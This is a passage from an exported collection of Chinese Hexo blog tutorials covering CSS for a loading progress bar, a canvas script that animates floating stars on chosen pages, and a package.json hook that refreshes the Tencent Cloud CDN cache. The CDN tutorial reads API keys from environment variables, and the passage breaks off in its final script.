<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230428200140054.png" alt="image-20230428200140054"></p>
<h1>其他样式</h1>
<p>也可以尝试这一种：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230428195652087.png" alt="image-20230428195652087"></p>
<h2>基础版本</h2>
<pre><code class="language-css">.pace {
    -webkit-pointer-events: none;
    pointer-events: none;
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
    z-index: 2000;
    position: fixed;
    margin: auto;
    top: 4px;
    left: 0;
    right: 0;
    height: 8px;
    border-radius: 8px;
    width: 4rem;
    background: #eaecf2;
    border: 1px #e3e8f7;
    overflow: hidden
}

.pace-inactive .pace-progress {
    opacity: 0;
    transition: .3s ease-in
}

.pace .pace-progress {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    -ms-box-sizing: border-box;
    -o-box-sizing: border-box;
    box-sizing: border-box;
    -webkit-transform: translate3d(0, 0, 0);
    -moz-transform: translate3d(0, 0, 0);
    -ms-transform: translate3d(0, 0, 0);
    -o-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
    max-width: 200px;
    position: absolute;
    z-index: 2000;
    display: block;
    top: 0;
    right: 100%;
    height: 100%;
    width: 100%;
    background: linear-gradient(215deg, #05662a 0%, #bffc16 100%);
    animation: gradient 2s ease infinite;
    background-size: 200%
}

.pace.pace-inactive {
    opacity: 0;
    transition: .3s;
    top: -8px
}
</code></pre>
<h2>动态版本</h2>
<pre><code class="language-css">.pace {
    -webkit-pointer-events: none;
    pointer-events: none;
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
    z-index: 2000;
    position: fixed;
    margin: auto;
    top: 4px;
    left: 0;
    right: 0;
    height: 8px;
    border-radius: 8px;
    width: 4rem;
    background: #eaecf2;
    border: 1px #e3e8f7;
    overflow: hidden
}

.pace-inactive .pace-progress {
    opacity: 0;
    transition: .3s ease-in
}

.pace .pace-progress {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    -ms-box-sizing: border-box;
    -o-box-sizing: border-box;
    box-sizing: border-box;
    -webkit-transform: translate3d(0, 0, 0);
    -moz-transform: translate3d(0, 0, 0);
    -ms-transform: translate3d(0, 0, 0);
    -o-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
    max-width: 200px;
    position: absolute;
    z-index: 2000;
    display: block;
    top: 0;
    right: 100%;
    height: 100%;
    width: 100%;
    background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
    animation: gradient 1.5s ease infinite;
    background-size: 200%
}

.pace.pace-inactive {
    opacity: 0;
    transition: .3s;
    top: -8px
}
@keyframes gradient {
  0% {
    background-position: 0% 50%;
  }
  50% {
    background-position: 100% 50%;
  }
  100% {
    background-position: 0% 50%;
  }
}
</code></pre>
<p>对比两个版本的差异，相信你能自定义出一套自己的进度条。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.trfox.ml/p/81434d957ca9/">给你的网站/博客顶部加上加载进度条 | Teror (trfox.ml)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="414962704">
                            <a href="#414962704">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客的写作与装饰</span>
                                
                                <div class="record-links-context hover">
                                    <p>加入进度条：<a href="#1308325830" title="在你的 Hexo 博客上加入进度条" class="record-link highlight">在你的 Hexo 博客上加入进度条</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="681885666" class="record">
            <header>
                <h1 class="record-title">Hexo 博客添加漂浮物效果（可定制显示页面）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('ButterFly');">ButterFly</button>
                    
                    <button class="btn" onclick="activeTag('JavaScript');">JavaScript</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/30/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/starfloat.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>为博客添加漂浮物效果，并可定制需要显示漂浮物的页面。Hexo 优雅改。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>28a4bfe2</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>本文为 Hexo Butterfly 主题的优雅改（只引入 js 文件）。</p>
<p>原码参考自：<a href="https://yisous.xyz/posts/670e47f/#%E8%90%BD%E6%A8%B1%E7%89%B9%E6%95%88%E6%90%AD%E9%85%8D%E5%8D%9A%E5%AE%A2%E8%AE%BE%E7%BD%AE%E9%A3%9F%E7%94%A8">博客魔改日记（3） | Ariasakaの小窝 (yisous.xyz)</a>，在其中做了改动：</p>
<ul>
<li>替换了部分变量和注释名</li>
<li>增加可定制显示漂浮物页面的逻辑</li>
</ul>
<h1>引入方式 1：作为 js 文件直接 inject 到博客中</h1>
<p>这种方式在对于多个页面使用漂浮物效果时有用。</p>
<p>使用方法：</p>
<ul>
<li>需要所有博客页面都显示漂浮物：将 <code>allowAll = true</code></li>
<li>指定显示漂浮物的页面：将 <code>allowAll = false</code>，在 urlAllowList 中列出需要显示漂浮物的网页相对地址。如 <code>/about/</code>。</li>
</ul>
<p>优点：统一指定需要使用漂浮物的 url。</p>
<p>缺点：还是有那么一点不灵活。</p>
<p>js 代码：</p>
<pre><code class="language-js">// 漂浮物
// 新增函数 
// 首先获取 Url，然后把 Url 通过 // 截成两部分，再从后一部分中截取相对路径。如果截取到的相对路径中有参数，则把参数去掉。
// 获取相对路径
function GetUrlRelativePath()
{
    var url = document.location.toString();
    var arrUrl = url.split(&quot;//&quot;);

    var start = arrUrl[1].indexOf(&quot;/&quot;);
    var relUrl = arrUrl[1].substring(start);//stop省略，截取从start开始到结尾的所有字符

    if(relUrl.indexOf(&quot;?&quot;) != -1){
        relUrl = relUrl.split(&quot;?&quot;)[0];
    }
    return relUrl;
}
var allowAll = false; // true 则允许所有网页存在漂浮物
// 允许显示漂浮物的网址列表
var urlAllowList = [
    &quot;/about/&quot;,
    &quot;/link/friends/&quot;,
]

var isAllowFloat = false;   // 全局变量，允许使用漂浮特效

// 判断
function decide(){
    isAllowFloat = true;
    if(!allowAll){
        // 判断当前页面是否为指定页面
        var url = GetUrlRelativePath();
        var i = 0;
        for(;i&lt;urlAllowList.length;i++){
            if(url===urlAllowList[i]){
                // console.log(i);
                isAllowFloat = true;
                break;
            }
        }
        if(i===urlAllowList.length){
            isAllowFloat = false;
        }
    }
    console.log(isAllowFloat)
    if(isAllowFloat)startFloat();
}

var stop, staticx;
var img = new Image();
img.src = &quot;/image/star_float.png&quot;; // 图片

function Float(x, y, s, r, fn) {
    this.x = x;
    this.y = y;
    this.s = s;
    this.r = r;
    this.fn = fn;
}

Float.prototype.draw = function(cxt) {
    cxt.save();
    var xc = 40 * this.s / 4;
    cxt.translate(this.x, this.y);
    cxt.rotate(this.r);
    cxt.drawImage(img, 0, 0, 35 * this.s, 35 * this.s)
    //漂浮物大小
    cxt.restore();
}

Float.prototype.update = function() {
    this.x = this.fn.x(this.x, this.y);
    this.y = this.fn.y(this.y, this.y);
    this.r = this.fn.r(this.r);
    if (this.x &gt; window.innerWidth || this.x &lt; 0 || this.y &gt; window.innerHeight || this.y &lt; 0) {
        this.r = getRandom('fnr');
        if (Math.random() &gt; 0.4) {
            this.x = getRandom('x');
            this.y = 0;
            this.s = getRandom('s');
            this.r = getRandom('r');
        } else {
            this.x = window.innerWidth;
            this.y = getRandom('y');
            this.s = getRandom('s');
            this.r = getRandom('r');
        }
    }
}

FloatList = function() {
    this.list = [];
}
FloatList.prototype.push = function(float) {
    this.list.push(float);
}
FloatList.prototype.update = function() {
    for (var i = 0, len = this.list.length; i &lt; len; i++) {
        this.list[i].update();
    }
}
FloatList.prototype.draw = function(cxt) {
    for (var i = 0, len = this.list.length; i &lt; len; i++) {
        this.list[i].draw(cxt);
    }
}
FloatList.prototype.get = function(i) {
    return this.list[i];
}
FloatList.prototype.size = function() {
    return this.list.length;
}

function getRandom(option) {
    var ret, random;
    switch (option) {
    case 'x':
        ret = Math.random() * window.innerWidth;
        break;
    case 'y':
        ret = Math.random() * window.innerHeight;
        break;
    case 's':
        ret = Math.random();
        break;
    case 'r':
        ret = Math.random() * 6;
        break;
    case 'fnx':
        random = -0.5 + Math.random() * 1;
        ret = function(x, y) {
            return x + 0.5 * random - 0.6;
            //x轴速度
        }
        ;
        break;
    case 'fny':
        random = 0.8 + Math.random() * 0.7
        //y轴速度
        ret = function(x, y) {
            return y + random;
        }
        ;
        break;
    case 'fnr':
        random = Math.random() * 0.03;
        ret = function(r) {
            return r + random;
        }
        ;
        break;
    }
    return ret;
}

function startFloat() {

    requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || window.oRequestAnimationFrame;
    var canvas = document.createElement('canvas'), cxt;
    staticx = true;
    canvas.height = window.innerHeight;
    canvas.width = window.innerWidth;
    canvas.setAttribute('style', 'position: fixed;left: 0;top: 0;pointer-events: none;');
    canvas.setAttribute('id', 'canvas_float');
    document.getElementsByTagName('body')[0].appendChild(canvas);
    cxt = canvas.getContext('2d');
    var floatList = new FloatList();
    for (var i = 0; i &lt; 10; i++) {
        //漂浮物数量
        var float, randomX, randomY, randomS, randomR, randomFnx, randomFny;
        randomX = getRandom('x');
        randomY = getRandom('y');
        randomR = getRandom('r');
        randomS = getRandom('s');
        randomFnx = getRandom('fnx');
        randomFny = getRandom('fny');
        randomFnR = getRandom('fnr');
        float = new Float(randomX,randomY,randomS,randomR,{
            x: randomFnx,
            y: randomFny,
            r: randomFnR
        });
        float.draw(cxt);
        floatList.push(float);
    }
    stop = requestAnimationFrame(function() {
        cxt.clearRect(0, 0, canvas.width, canvas.height);
        floatList.update();
        floatList.draw(cxt);
        stop = requestAnimationFrame(arguments.callee);
    })
}

window.onresize = function() {
    if(!isAllowFloat)return;
    var canvasSnow = document.getElementById('canvas_float');
    canvasSnow.width = window.innerWidth;
    canvasSnow.height = window.innerHeight;
}

function stopp(e) {
    if (!e &amp;&amp; document.getElementById(&quot;canvas_float&quot;)) {
        var child = document.getElementById(&quot;canvas_float&quot;);
        child.parentNode.removeChild(child);
        window.cancelAnimationFrame(stop);
    } else if (e &amp;&amp; !document.getElementById(&quot;canvas_float&quot;)) {
        decide();
    }
}

window.addEventListener(&quot;DOMContentLoaded&quot;,decide);
</code></pre>
<h1>引入方式 2：只在单个普通文章中使用</h1>
<p>就像本页面。</p>
<p>优点：省去博客每次都要请求一个 js 文件。缺点：不灵活。</p>
<p>直接在文章末尾插入 script，等 markdown 文件渲染成 html 后就相当于只注入这段脚本到当前页面：</p>
<pre><code class="language-js">&lt;script&gt;

var stop, staticx;
var img = new Image();
img.src = &quot;/image/star_float.png&quot;; // 图片

function Float(x, y, s, r, fn) {
    this.x = x;
    this.y = y;
    this.s = s;
    this.r = r;
    this.fn = fn;
}

Float.prototype.draw = function(cxt) {
    cxt.save();
    var xc = 40 * this.s / 4;
    cxt.translate(this.x, this.y);
    cxt.rotate(this.r);
    cxt.drawImage(img, 0, 0, 35 * this.s, 35 * this.s)
    //漂浮物大小
    cxt.restore();
}

Float.prototype.update = function() {
    this.x = this.fn.x(this.x, this.y);
    this.y = this.fn.y(this.y, this.y);
    this.r = this.fn.r(this.r);
    if (this.x &gt; window.innerWidth || this.x &lt; 0 || this.y &gt; window.innerHeight || this.y &lt; 0) {
        this.r = getRandom('fnr');
        if (Math.random() &gt; 0.4) {
            this.x = getRandom('x');
            this.y = 0;
            this.s = getRandom('s');
            this.r = getRandom('r');
        } else {
            this.x = window.innerWidth;
            this.y = getRandom('y');
            this.s = getRandom('s');
            this.r = getRandom('r');
        }
    }
}

FloatList = function() {
    this.list = [];
}
FloatList.prototype.push = function(float) {
    this.list.push(float);
}
FloatList.prototype.update = function() {
    for (var i = 0, len = this.list.length; i &lt; len; i++) {
        this.list[i].update();
    }
}
FloatList.prototype.draw = function(cxt) {
    for (var i = 0, len = this.list.length; i &lt; len; i++) {
        this.list[i].draw(cxt);
    }
}
FloatList.prototype.get = function(i) {
    return this.list[i];
}
FloatList.prototype.size = function() {
    return this.list.length;
}

function getRandom(option) {
    var ret, random;
    switch (option) {
    case 'x':
        ret = Math.random() * window.innerWidth;
        break;
    case 'y':
        ret = Math.random() * window.innerHeight;
        break;
    case 's':
        ret = Math.random();
        break;
    case 'r':
        ret = Math.random() * 6;
        break;
    case 'fnx':
        random = -0.5 + Math.random() * 1;
        ret = function(x, y) {
            return x + 0.5 * random - 0.6;
            //x轴速度
        }
        ;
        break;
    case 'fny':
        random = 0.8 + Math.random() * 0.7
        //y轴速度
        ret = function(x, y) {
            return y + random;
        }
        ;
        break;
    case 'fnr':
        random = Math.random() * 0.03;
        ret = function(r) {
            return r + random;
        }
        ;
        break;
    }
    return ret;
}

function startFloat() {

    requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || window.oRequestAnimationFrame;
    var canvas = document.createElement('canvas'), cxt;
    staticx = true;
    canvas.height = window.innerHeight;
    canvas.width = window.innerWidth;
    canvas.setAttribute('style', 'position: fixed;left: 0;top: 0;pointer-events: none;');
    canvas.setAttribute('id', 'canvas_float');
    document.getElementsByTagName('body')[0].appendChild(canvas);
    cxt = canvas.getContext('2d');
    var floatList = new FloatList();
    for (var i = 0; i &lt; 10; i++) {
        //漂浮物数量
        var float, randomX, randomY, randomS, randomR, randomFnx, randomFny;
        randomX = getRandom('x');
        randomY = getRandom('y');
        randomR = getRandom('r');
        randomS = getRandom('s');
        randomFnx = getRandom('fnx');
        randomFny = getRandom('fny');
        randomFnR = getRandom('fnr');
        float = new Float(randomX,randomY,randomS,randomR,{
            x: randomFnx,
            y: randomFny,
            r: randomFnR
        });
        float.draw(cxt);
        floatList.push(float);
    }
    stop = requestAnimationFrame(function() {
        cxt.clearRect(0, 0, canvas.width, canvas.height);
        floatList.update();
        floatList.draw(cxt);
        stop = requestAnimationFrame(arguments.callee);
    })
}

window.onresize = function() {
    if(!isAllowFloat)return;
    var canvasSnow = document.getElementById('canvas_float');
    canvasSnow.width = window.innerWidth;
    canvasSnow.height = window.innerHeight;
}

function stopp(e) {
    if (!e &amp;&amp; document.getElementById(&quot;canvas_float&quot;)) {
        var child = document.getElementById(&quot;canvas_float&quot;);
        child.parentNode.removeChild(child);
        window.cancelAnimationFrame(stop);
    } else if (e &amp;&amp; !document.getElementById(&quot;canvas_float&quot;)) {
        //decide();
    }
}

startFloat();
&lt;/script&gt;
</code></pre>
<p>这段脚本其实就是把页面判断逻辑删去了。注意选择的图片路径。</p>
<h1>未来计划</h1>
<ul>
<li>[ ] 简化 Script</li>
<li>[ ] 节日触发漂浮物效果，以及优雅进行实现。<a href="https://blog.csdn.net/LEVsunshine/article/details/109069345">js处理时间戳为各种格式/js判断公历/农历/周历节日和节气_js 二十四节气计算_to Zero-的博客-CSDN博客</a></li>
</ul>
<script>

var stop, staticx;
var img = new Image();
img.src = "/image/star_float.png"; // 图片

function Float(x, y, s, r, fn) {
    this.x = x;
    this.y = y;
    this.s = s;
    this.r = r;
    this.fn = fn;
}

Float.prototype.draw = function(cxt) {
    cxt.save();
    var xc = 40 * this.s / 4;
    cxt.translate(this.x, this.y);
    cxt.rotate(this.r);
    cxt.drawImage(img, 0, 0, 35 * this.s, 35 * this.s)
    //漂浮物大小
    cxt.restore();
}

Float.prototype.update = function() {
    this.x = this.fn.x(this.x, this.y);
    this.y = this.fn.y(this.y, this.y);
    this.r = this.fn.r(this.r);
    if (this.x > window.innerWidth || this.x < 0 || this.y > window.innerHeight || this.y < 0) {
        this.r = getRandom('fnr');
        if (Math.random() > 0.4) {
            this.x = getRandom('x');
            this.y = 0;
            this.s = getRandom('s');
            this.r = getRandom('r');
        } else {
            this.x = window.innerWidth;
            this.y = getRandom('y');
            this.s = getRandom('s');
            this.r = getRandom('r');
        }
    }
}

FloatList = function() {
    this.list = [];
}
FloatList.prototype.push = function(float) {
    this.list.push(float);
}
FloatList.prototype.update = function() {
    for (var i = 0, len = this.list.length; i < len; i++) {
        this.list[i].update();
    }
}
FloatList.prototype.draw = function(cxt) {
    for (var i = 0, len = this.list.length; i < len; i++) {
        this.list[i].draw(cxt);
    }
}
FloatList.prototype.get = function(i) {
    return this.list[i];
}
FloatList.prototype.size = function() {
    return this.list.length;
}

function getRandom(option) {
    var ret, random;
    switch (option) {
    case 'x':
        ret = Math.random() * window.innerWidth;
        break;
    case 'y':
        ret = Math.random() * window.innerHeight;
        break;
    case 's':
        ret = Math.random();
        break;
    case 'r':
        ret = Math.random() * 6;
        break;
    case 'fnx':
        random = -0.5 + Math.random() * 1;
        ret = function(x, y) {
            return x + 0.5 * random - 0.6;
            //x轴速度
        }
        ;
        break;
    case 'fny':
        random = 0.8 + Math.random() * 0.7
        //y轴速度
        ret = function(x, y) {
            return y + random;
        }
        ;
        break;
    case 'fnr':
        random = Math.random() * 0.03;
        ret = function(r) {
            return r + random;
        }
        ;
        break;
    }
    return ret;
}

function startFloat() {

    requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || window.oRequestAnimationFrame;
    var canvas = document.createElement('canvas'), cxt;
    staticx = true;
    canvas.height = window.innerHeight;
    canvas.width = window.innerWidth;
    canvas.setAttribute('style', 'position: fixed;left: 0;top: 0;pointer-events: none;');
    canvas.setAttribute('id', 'canvas_float');
    document.getElementsByTagName('body')[0].appendChild(canvas);
    cxt = canvas.getContext('2d');
    var floatList = new FloatList();
    for (var i = 0; i < 10; i++) {
        //漂浮物数量
        var float, randomX, randomY, randomS, randomR, randomFnx, randomFny;
        randomX = getRandom('x');
        randomY = getRandom('y');
        randomR = getRandom('r');
        randomS = getRandom('s');
        randomFnx = getRandom('fnx');
        randomFny = getRandom('fny');
        randomFnR = getRandom('fnr');
        float = new Float(randomX,randomY,randomS,randomR,{
            x: randomFnx,
            y: randomFny,
            r: randomFnR
        });
        float.draw(cxt);
        floatList.push(float);
    }
    stop = requestAnimationFrame(function() {
        cxt.clearRect(0, 0, canvas.width, canvas.height);
        floatList.update();
        floatList.draw(cxt);
        stop = requestAnimationFrame(arguments.callee);
    })
}

window.onresize = function() {
    if(!isAllowFloat)return;
    var canvasSnow = document.getElementById('canvas_float');
    canvasSnow.width = window.innerWidth;
    canvasSnow.height = window.innerHeight;
}

function stopp(e) {
    if (!e && document.getElementById("canvas_float")) {
        var child = document.getElementById("canvas_float");
        child.parentNode.removeChild(child);
        window.cancelAnimationFrame(stop);
    } else if (e && !document.getElementById("canvas_float")) {
        //decide();
    }
}

startFloat();
</script>

                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="414962704">
                            <a href="#414962704">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客的写作与装饰</span>
                                
                                <div class="record-links-context hover">
                                    <p>漂浮物的显示：<a href="#681885666" title="Hexo 博客添加漂浮物效果（可定制显示页面）" class="record-link highlight">Hexo 博客添加漂浮物效果（可定制显示页面）</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2958737902" class="record">
            <header>
                <h1 class="record-title">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('CDN');">CDN</button>
                    
                    <button class="btn" onclick="activeTag('API');">API</button>
                    
                    <button class="btn" onclick="activeTag('Node.js');">Node.js</button>
                    
                    <button class="btn" onclick="activeTag('JavaScript');">JavaScript</button>
                    
                    <button class="btn" onclick="activeTag('Hexo');">Hexo</button>
                    
                    <button class="btn" onclick="activeTag('WordPress');">WordPress</button>
                    
                    <button class="btn" onclick="activeTag('php');">php</button>
                    
                    <button class="btn" onclick="activeTag('SDK');">SDK</button>
                    
                    <button class="btn" onclick="activeTag('腾讯云');">腾讯云</button>
                    
                    <button class="btn" onclick="activeTag('对象存储');">对象存储</button>
                    
                    <button class="btn" onclick="activeTag('COS');">COS</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/1/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/tencentcdn545.jpg</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>b05ac1ee</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>本文提供两类博客刷新CDN方法，另附有腾讯云SDK的使用介绍以及API KEY安全使用方法</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!success] 本文已收录至 <a href="https://butterfly.zhheo.com/">Butterfly 主题美化教程</a></p>
</blockquote>
<p>使用了 CDN 加速源站的小伙伴可能会遇到一个问题，那就是每次发布博客到服务器后，都需要手动在腾讯云控制台进行节点的缓存刷新，很是麻烦。这里我介绍几种刷新 CDN 缓存的方法，对于 Hexo 博客，将着重介绍通过脚本的思路实现一键发布的具体流程。</p>
<h1>方案一：腾讯云对象存储的 CDN 刷新</h1>
<p>首先介绍官方方案。点击存储桶后可以找到 CDN 缓存刷新函数，这是一项收费服务。有兴趣的小伙伴可以试一试。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230824094657.png" alt="image.png"></p>
<h1>方案二：自写 JS 脚本并利用钩子实现（Hexo 方案）</h1>
<h2>思路（package.json 编写）</h2>
<p>在接触 Hexo 博客建站的时候，你一定会知道 Hexo 三连：</p>
<pre><code class="language-sh">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d
# 当然可以简写成
hexo clean &amp;&amp; hexo d -g
</code></pre>
<blockquote>
<p>命令含义参考：<a href="https://hexo.io/zh-cn/docs/commands">指令 | Hexo</a></p>
</blockquote>
<p>上面的命令可以写进 <code>[blog_root]/package.json</code> 的 <code>scripts</code> 中，如：</p>
<pre><code class="language-json">&quot;scripts&quot;: {
	&quot;publish&quot;: &quot;hexo clean &amp;&amp; hexo d -g&quot;,
	&quot;start&quot;: &quot;hexo clean &amp;&amp; hexo g &amp;&amp; hexo s&quot;
},
</code></pre>
<p>这样每次部署我们只需要运行 <code>npm run publish</code> 即可完成连击。</p>
<p>在完成博客部署连击后，我们可以再执行一个脚本刷新腾讯云 CDN 缓存。我打算写一个 js 脚本 <code>auto_flush_cdn.js</code> 用 node 运行（毕竟玩 Hexo 总会装有 Node.js 的吧）。</p>
<p>这样我们的部署脚本就会是这样：</p>
<pre><code class="language-json">&quot;scripts&quot;: {
  &quot;publish&quot;: &quot;hexo clean &amp;&amp; hexo d -g &amp;&amp; node .\\auto_flush_cdn.js&quot;,
},
</code></pre>
<p>或者利用钩子：</p>
<pre><code class="language-json">&quot;scripts&quot;: {
	&quot;publish&quot;: &quot;hexo clean &amp;&amp; hexo d -g&quot;,
    &quot;postpublish&quot;: &quot;node .\\auto_flush_cdn.js&quot;,
},
</code></pre>
<p>现在的问题就是 <code>auto_flush_cdn.js</code> 该如何写。</p>
<h2>使用腾讯云 SDK 进行开发</h2>
<p>登录腾讯云后，打开云产品&gt;云 API：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230501153225264.png" alt="image-20230501153225264"></p>
<p>我们要使用腾讯云 SDK，需要先安装依赖：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%25E4%25BE%259D%25E8%25B5%2596%25E4%25B8%258B%25E8%25BD%25BDdfsdf.jpg" alt="依赖下载dfsdf"></p>
<p>这里我就安装在博客目录了：博客下新建终端运行命令 <code>npm install tencentcloud-sdk-nodejs-cdn --save</code></p>
<blockquote>
<p>[!hint] 提示<br>
实践中遇到找不到模块的问题，安装好依赖后记得重启终端、VSCode 甚至电脑。如果不行请另外搜索解决方案。</p>
</blockquote>
<p>然后找到对应的 API，按照平台指示的说明填写好参数，充分利用其诊断工具进行在线调试。（一般不会出什么问题）</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%25E7%25BA%25BF%25E4%25B8%258A%25E5%25B0%259D%25E8%25AF%2595%25E6%258E%25A5%25E5%258F%25A3dfdff.jpg" alt="线上尝试接口dfdff"></p>
<p>没有问题的话我们就可以把平台代码复制下来了，在代码中改改 API ID 和 API KEY 参数即可。</p>
<blockquote>
<p>[!warning] 注意<br>
此处 API ID 和 API KEY 参数填写仅供演示。为了安全起见，建议不要在代码中写入任何的密匙。详情看下一小节。</p>
</blockquote>
<p>运行一下我们的脚本文件尝试一下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%25E6%2588%2590%25E5%258A%259Fddf.jpg" alt="成功ddf"></p>
<p>没有返回错误信息，看了看控制台确实进行了刷新。如果出现问题，可以把 RequestId 粘贴到 <a href="https://console.cloud.tencent.com/api/diagnosis">API Doctor(使用诊断) - 云 API - 控制台 (tencent.com)</a> 进行诊断。</p>
<p>附控制台看刷新纪录的方法，打开内容分发网络找刷新预热的操作记录：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%25E6%259F%25A5%25E7%259C%258B%25E6%259C%2589%25E6%25B2%25A1%25E6%259C%2589%25E5%2588%25B7%25E6%2596%25B0%25E6%2588%2590%25E5%258A%259F6546.jpg" alt="查看有没有刷新成功6546"></p>
<h2>安全使用 API KEY</h2>
<p>在使用腾讯云 SDK 进行开发时，不可避免的需要传入 API KEY，但是把密匙硬写在代码中是不安全的。</p>
<blockquote>
<p>[!warning] 注意<br>
代码泄露可能会导致 SecretId 和 SecretKey 泄露，并威胁账号下所有资源的安全性。建议不要在代码中使用持久 SecretId 和 SecretKey。</p>
<p><em>——腾讯云</em></p>
</blockquote>
<p>这里介绍的是通过环境变量读取 SecretId 和 SecretKey 方案。</p>
<h3>Windows</h3>
<p>首先在自己的系统中配置环境变量，把自己的 SecretId 和 SecretKey 填进去：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%25E7%25A4%25BA%25E4%25BE%258Benv546546.jpg" alt="示例env546546"></p>
<p>我们可以写一个 demo 测试一下：</p>
<p>新建 <code>test_env.js</code>，写入两行代码：</p>
<pre><code class="language-js">var Key = process.env.TENCENT_API_SECRETID;
console.log(Key)
</code></pre>
<p>运行脚本：</p>
<pre><code class="language-sh">node &lt;your test_env.js&gt;
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/test%2520env%2520%25E6%2588%2590%25E5%258A%259Fdfsdf.jpg" alt="test env 成功dfsdf"></p>
<p>若成功输出即配置成功。</p>
<blockquote>
<p>[!warning] 注意<br>
环境变量配置好后，记得重启你的终端、VSCode（如果你使用 VSCode 的终端）。太玄学的话，你懂的，重启电脑。</p>
</blockquote>
<p>在你刚刚从腾讯云复制下来的代码文件中做以下修改：</p>
<pre><code class="language-diff">const tencentcloud = require(&quot;tencentcloud-sdk-nodejs-cdn&quot;);

const CdnClient = tencentcloud.cdn.v20180606.Client;

+ var secretId = process.env.TENCENT_API_SECRETID;
+ var secretKey = process.env.TENCENT_API_SECRETKEY;
...

const clientConfig = {
  credential: {
-   secretId: &quot;SecretId&quot;,
-   secretKey: &quot;SecretKey&quot;,
+   secretId: secretId,
+   secretKey: secretKey,
  },
  ...
};
</code></pre>
<p>python 中使用环境变量的方法：</p>
<pre><code class="language-python">import os
os.environ[&quot;TENCENT_API_SECRETID&quot;]
os.environ[&quot;TENCENT_API_SECRETKEY&quot;]

# 或
os.environ.get(&quot;TENCENT_API_SECRETID&quot;)
os.environ.get(&quot;TENCENT_API_SECRETKEY&quot;)
</code></pre>
<h3>Linux</h3>
<p>Linux 中需要将环境变量持久化，方法有很多，这里我就演示其中一种。</p>
<pre><code class="language-sh">vim /etc/environment
</code></pre>
<p>添加：</p>
<pre><code>export TENCENT_API_SECRETID=AKIDvhxxxxxxxxxxxwP
export TENCENT_API_SECRETKEY=Exxxxxxxxxxxxxxxxh
</code></pre>
<p>然后手动执行命令使其生效：</p>
<pre><code class="language-sh">source /etc/environment
</code></pre>
<p>可以执行以下命令查看环境变量：</p>
<pre><code class="language-sh">export
# declare -x TENCENT_API_SECRETID=&quot;AKIDvhxxxxxxxxxxxwP&quot;
# declare -x TENCENT_API_SECRETKEY=&quot;Exxxxxxxxxxxxxxxxh&quot;
</code></pre>
<p>这种方法：</p>
<ul>
<li>生效时间：新开终端生效，或者手动 source /etc/environment 生效</li>
<li>生效期限：永久有效</li>
<li>生效范围：对所有用户有效</li>
</ul>
<h2>脚本</h2>
<p>最后的脚本文件文件：</p>
<pre><code class="language-js">// Depends on tencentcloud-sdk-nodejs version 4.0.3 or higher
const tencentcloud = require(&quot;tencentcloud-sdk-nodejs-cdn&quot;);

const CdnClient = tencentcloud.cdn.v20180606.Client;

var secretId = process.env.TENCENT_API_SECRETID;
